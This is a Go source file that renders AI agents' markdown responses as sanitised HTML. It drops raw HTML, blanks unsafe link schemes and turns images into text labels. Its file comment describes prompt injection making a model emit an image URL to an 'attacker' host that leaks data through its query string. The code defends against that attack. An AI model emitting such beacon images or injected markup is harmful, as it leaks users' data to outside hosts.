package web

// An agent's final response is model-authored prose, and models write
// markdown: headings, lists, bold, tables, fenced code. Rendered as one plain
// block it arrived as literal `##` and `**` — the review a person actually
// reads, shown as the source of a review.
//
// So it is rendered, through goldmark, on a converter that is NOT the one
// docs.go uses. That page renders this repo's own embedded documentation and
// may trust it; this one renders text a model wrote, which is one prompt
// injection away from being whatever the injector wanted on the page. The
// boundary is drawn here, and every part of it is a deliberate subtraction:
//
//   - Raw HTML is dropped, which is goldmark's default (WithUnsafe is not
//     set) — a <script> or an onclick= arrives as a comment, not as markup.
//   - A javascript: URL renders with an empty href, also goldmark's default.
//   - IMAGES ARE NOT FETCHED. This is the one hole the defaults leave open
//     and the dangerous one: `![](http://attacker/p.gif?run=…)` is an
//     outbound GET the moment a page opens, which makes a review a beacon.
//     They render as the alt text and the host that was wanted instead, which
//     is strictly more information than the picture.
//   - Links carry rel="noopener noreferrer nofollow" and open in a new tab,
//     so a model cannot navigate the page a reader is triaging on.
//   - Heading ids are NOT generated. The run page's own anchors are
//     #step-N-name, and an agent free to mint `id="heading"` is an agent that
//     can collide with them.
//
// Headings are demoted visually rather than structurally: an agent's h2 is
// subordinate to the run's h1 whatever it calls itself, and the .md rules in
// app.css say so without rewriting the document's outline.

import (
	"bytes"
	"fmt"
	"html/template"
	"net/url"
	"strings"

	chromahtml "github.com/alecthomas/chroma/v2/formatters/html"
	"github.com/alecthomas/chroma/v2/lexers"
	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/ast"
	"github.com/yuin/goldmark/extension"
	"github.com/yuin/goldmark/parser"
	gmrender "github.com/yuin/goldmark/renderer"
	"github.com/yuin/goldmark/text"
	"github.com/yuin/goldmark/util"
)

// agentMarkdown renders untrusted, model-authored prose.
//
// GFM for the tables and strikethrough models routinely emit, and the same
// chroma style docs.go uses so a fenced block in an answer looks like a
// fenced block anywhere else on the site. No WithUnsafe, and no
// WithAutoHeadingID — see the file comment for why each is absent.
var agentMarkdown = goldmark.New(
	goldmark.WithExtensions(extension.GFM),
	goldmark.WithParserOptions(parser.WithASTTransformers(
		util.Prioritized(inertImages{}, 100),
	)),
	goldmark.WithRendererOptions(
		gmrender.WithNodeRenderers(
			util.Prioritized(safeLinks{}, 100),
			util.Prioritized(codeFences{}, 100),
		),
	),
)

// codeFences renders every fenced block, in one of two ways.
//
// A ```json fence goes through this package's own JSON renderer, so the JSON
// in an answer looks identical to the JSON in the tool result one row above
// it — one data shape, one rendering, wherever it appears. Every other
// language is source text in a language this package has no business
// knowing, which is what chroma is for.
//
// One renderer covering both because goldmark has no fall-through: the
// highest-priority renderer registered for a node kind owns it outright, so
// the choice has to be made here rather than by declining.
type codeFences struct{}

func (c codeFences) RegisterFuncs(reg gmrender.NodeRendererFuncRegisterer) {
	reg.Register(ast.KindFencedCodeBlock, c.render)
	reg.Register(ast.KindCodeBlock, c.renderIndented)
}

func (codeFences) render(w util.BufWriter, source []byte, node ast.Node, entering bool) (ast.WalkStatus, error) {
	if !entering {
		return ast.WalkContinue, nil
	}

	fence, _ := node.(*ast.FencedCodeBlock)
	lang := strings.ToLower(string(fence.Language(source)))
	body := blockText(fence.Lines(), source)

	writeCodeBlock(w, lang, body)

	return ast.WalkSkipChildren, nil
}

// renderIndented covers a four-space block, which carries no language.
func (codeFences) renderIndented(w util.BufWriter, source []byte, node ast.Node, entering bool) (ast.WalkStatus, error) {
	if !entering {
		return ast.WalkContinue, nil
	}

	writeCodeBlock(w, "", blockText(node.Lines(), source))

	return ast.WalkSkipChildren, nil
}

// writeCodeBlock emits one code block, labelled with the language it declared
// so a reader can tell a proposed yaml from a shell transcript without
// reading it first.
func writeCodeBlock(w util.BufWriter, lang, body string) {
	_, _ = w.WriteString(`<div class="codeblock">`)

	if lang != "" {
		_, _ = w.WriteString(`<span class="codelang">`)
		_, _ = w.WriteString(template.HTMLEscapeString(lang))
		_, _ = w.WriteString(`</span>`)
	}

	_, _ = w.WriteString(`<pre class="json code">`)
	_, _ = w.WriteString(string(highlightCode(body, lang)))
	_, _ = w.WriteString(`</pre></div>`)
}

// blockText is a code block's source text.
func blockText(lines *text.Segments, source []byte) string {
	var body strings.Builder

	for i := range lines.Len() {
		line := lines.At(i)
		body.Write(line.Value(source))
	}

	return body.String()
}

// highlightCode colors one block: this package's renderer for a complete JSON
// document, chroma's lexer for everything else — including a JSON fence cut
// off mid-object, which is not a document and which the lexer can color where
// the parser can only refuse it.
func highlightCode(body, lang string) template.HTML {
	if body == "" {
		return " "
	}

	if lang == "json" {
		if block, ok := jsonBlock(body); ok {
			return block
		}
	}

	lexer := lexers.Get(lang)
	if lexer == nil {
		//nolint:gosec // G203: escaped, no markup added
		return template.HTML(template.HTMLEscapeString(body))
	}

	iterator, err := lexer.Tokenise(nil, body)
	if err != nil {
		//nolint:gosec // G203: as above
		return template.HTML(template.HTMLEscapeString(body))
	}

	var out strings.Builder

	// Standalone: no wrapping <pre> (writeCodeBlock owns that, so the block
	// matches every other code block on the page) and no class prefix, since
	// the style is carried inline rather than by a stylesheet this page does
	// not serve.
	formatter := chromahtml.New(chromahtml.WithClasses(false), chromahtml.PreventSurroundingPre(true))

	err = formatter.Format(&out, docsCodeStyle, iterator)
	if err != nil {
		//nolint:gosec // G203: as above
		return template.HTML(template.HTMLEscapeString(body))
	}

	//nolint:gosec // G203: chroma escapes token text; the markup is its own <span style=…>
	return template.HTML(out.String())
}

// renderProse renders one agent response to HTML.
//
// A failure yields the escaped source rather than nothing: a response that
// will not render is still a response somebody needs to read, and the raw
// text is a worse rendering, not a missing one.
func renderProse(text string) template.HTML {
	trimmed := strings.TrimSpace(text)
	if trimmed == "" {
		return ""
	}

	var out bytes.Buffer

	err := agentMarkdown.Convert([]byte(trimmed), &out)
	if err != nil {
		//nolint:gosec // G203: escaped, no markup added
		return template.HTML("<p>" + template.HTMLEscapeString(trimmed) + "</p>")
	}

	//nolint:gosec // G203: the whole contract of agentMarkdown above is that its output is safe
	return template.HTML(out.String())
}

// inertImages replaces every image with the text of what it asked for, before
// the renderer ever sees one. A transformer rather than a renderer override
// so an image nested inside a link or a table cell is caught the same way.
type inertImages struct{}

func (inertImages) Transform(doc *ast.Document, reader text.Reader, _ parser.Context) {
	var found []*ast.Image

	_ = ast.Walk(doc, func(node ast.Node, entering bool) (ast.WalkStatus, error) {
		if image, ok := node.(*ast.Image); ok && entering {
			found = append(found, image)
		}

		return ast.WalkContinue, nil
	})

	for _, image := range found {
		// NOT SetCode(true): goldmark writes a "code" string verbatim, and
		// this one is built from the image's own alt text and host, both
		// model-authored. Left as an ordinary string it is escaped on the way
		// out, which is the entire point of replacing the image.
		replacement := ast.NewString([]byte(imageLabel(image, reader)))

		image.Parent().ReplaceChild(image.Parent(), image, replacement)
	}
}

// imageLabel describes the image that was not loaded: its alt text, and the
// host it wanted. The host, not the whole URL, because the query string is
// where an exfiltrated payload would ride and reprinting it verbatim puts it
// back on the page.
func imageLabel(image *ast.Image, reader text.Reader) string {
	alt := strings.TrimSpace(string(image.Text(reader.Source()))) //nolint:staticcheck // ast.Image has no non-deprecated text accessor

	host := "an external host"

	parsed, err := url.Parse(string(image.Destination))
	if err == nil && parsed.Host != "" {
		host = parsed.Host
	}

	if alt == "" {
		return fmt.Sprintf("[image not loaded · %s]", host)
	}

	return fmt.Sprintf("[image not loaded · %s · %s]", alt, host)
}

// safeLinks renders links with the attributes that keep a model-authored one
// from acting on the page it sits in.
type safeLinks struct{}

func (s safeLinks) RegisterFuncs(reg gmrender.NodeRendererFuncRegisterer) {
	reg.Register(ast.KindLink, s.render)
	reg.Register(ast.KindAutoLink, s.renderAuto)
}

func (safeLinks) render(w util.BufWriter, _ []byte, node ast.Node, entering bool) (ast.WalkStatus, error) {
	if !entering {
		_, _ = w.WriteString("</a>")

		return ast.WalkContinue, nil
	}

	link, _ := node.(*ast.Link)
	writeAnchor(w, string(link.Destination))

	return ast.WalkContinue, nil
}

func (safeLinks) renderAuto(w util.BufWriter, source []byte, node ast.Node, entering bool) (ast.WalkStatus, error) {
	if !entering {
		return ast.WalkContinue, nil
	}

	link, _ := node.(*ast.AutoLink)
	target := string(link.URL(source))

	writeAnchor(w, target)
	_, _ = w.WriteString(template.HTMLEscapeString(string(link.Label(source))))
	_, _ = w.WriteString("</a>")

	return ast.WalkContinue, nil
}

// writeAnchor opens an anchor whose scheme has been vetted.
func writeAnchor(w util.BufWriter, destination string) {
	_, _ = w.WriteString(`<a href="`)
	_, _ = w.WriteString(template.HTMLEscapeString(safeURL(destination)))
	_, _ = w.WriteString(`" rel="noopener noreferrer nofollow" target="_blank">`)
}

// safeURL passes through the schemes a link may use and blanks everything
// else. An allow-list rather than a javascript:-denylist, because the schemes
// worth linking to are a short known set and the ones worth blocking are not
// (data:, vbscript:, and whatever a browser adds next).
func safeURL(destination string) string {
	trimmed := strings.TrimSpace(destination)

	// A relative link or a fragment names something on this site and carries
	// no scheme to vet.
	if trimmed == "" || strings.HasPrefix(trimmed, "/") || strings.HasPrefix(trimmed, "#") {
		return trimmed
	}

	parsed, err := url.Parse(trimmed)
	if err != nil {
		return ""
	}

	switch strings.ToLower(parsed.Scheme) {
	case "", "http", "https", "mailto":
		return trimmed
	default:
		return ""
	}
}
